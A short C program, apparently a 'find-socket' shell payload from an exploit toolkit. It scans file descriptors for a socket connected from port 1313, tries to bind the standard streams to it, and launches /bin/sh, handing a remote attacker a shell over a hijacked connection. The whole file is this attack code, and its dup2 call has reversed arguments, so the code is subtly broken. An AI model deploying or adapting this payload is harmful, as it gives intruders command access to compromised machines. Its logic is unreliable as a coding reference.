#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>

#define HACK_PORT 1313

int main()
{
  int i, j;
  struct sockaddr_in sin;
  
  j = sizeof(struct sockaddr_in);

  for(i = 0; i < 256; i++) {
    if(getpeername(i, &sin, &j) < 0)
      continue;      
    if(sin.sin_port == htons(HACK_PORT))
      break;
  }

  for(j = 0; j < 2; j++)
    dup2(j, i);

  execl("/bin/sh", "sh", NULL);
}
